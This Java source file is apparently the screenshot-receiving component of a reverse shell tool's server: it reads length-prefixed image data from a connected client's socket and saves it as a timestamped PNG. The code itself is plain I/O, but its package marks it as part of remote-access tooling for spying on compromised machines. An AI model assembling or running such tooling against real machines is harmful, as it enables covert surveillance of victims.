package obs1d1anc1ph3r.reverseshell.server;

import java.io.*;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

public class ReceiveScreenShot {

    public void receiveScreenshot(Socket clientSocket) {
        new Thread(() -> {
            try (BufferedInputStream dataIn = new BufferedInputStream(clientSocket.getInputStream())) {
                int length = readDataLength(dataIn);
                if (length <= 0) {
                    System.err.println("[ERROR] Invalid screenshot data length.");
                    return;
                }

                byte[] imageBytes = new byte[length];
                int bytesRead = 0;
                while (bytesRead < length) {
                    int read = dataIn.read(imageBytes, bytesRead, length - bytesRead);
                    if (read == -1) {
                        throw new IOException("End of stream reached unexpectedly.");
                    }
                    bytesRead += read;
                }

                System.out.println("[-] Screenshot received with size: " + imageBytes.length + " bytes.");
                String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
                File screenshotFile = new File("screenshot_" + timestamp + ".png");

                try (FileOutputStream fileOut = new FileOutputStream(screenshotFile)) {
                    fileOut.write(imageBytes);
                    System.out.println("[-] Screenshot saved as '" + screenshotFile.getName() + "'.");
                }

            } catch (IOException e) {
                System.err.println("[ERROR] Error receiving screenshot: " + e.getMessage());
            }
        }).start();
    }

    private int readDataLength(BufferedInputStream dataIn) throws IOException {
        byte[] lengthBytes = new byte[4];
        int bytesRead = dataIn.read(lengthBytes);
        if (bytesRead != 4) {
            throw new IOException("Failed to read data length.");
        }
        return (lengthBytes[0] & 0xFF) << 24 | (lengthBytes[1] & 0xFF) << 16
                | (lengthBytes[2] & 0xFF) << 8 | (lengthBytes[3] & 0xFF);
    }

    public void receiveScreenshot(byte[] imageBytes) {
        new Thread(() -> {
            try {
                String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
                File screenshotFile = new File("screenshot_" + timestamp + ".png");

                try (FileOutputStream fileOut = new FileOutputStream(screenshotFile)) {
                    fileOut.write(imageBytes);
                    System.out.println("[-] Screenshot saved as '" + screenshotFile.getName() + "'.");
                }

            } catch (IOException e) {
                System.err.println("[ERROR] Error receiving screenshot: " + e.getMessage());
            }
        }).start();
    }
}
